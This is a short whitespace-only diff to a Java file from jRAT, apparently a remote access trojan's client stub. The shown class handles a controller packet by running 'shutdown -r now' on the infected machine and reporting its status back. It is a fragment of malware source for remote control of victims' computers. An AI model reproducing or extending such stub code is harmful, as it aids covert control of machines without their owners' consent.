@@ -4,7 +4,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Constants;
 
-
 public class Packet29RestartComputer extends AbstractIncomingPacket {
 
 	@Override
@@ -16,7 +15,7 @@ public class Packet29RestartComputer extends AbstractIncomingPacket {
 			Runtime.getRuntime().exec("shutdown -r now");
 			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
 		} else {
-			
+
 			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
 		}
 	}
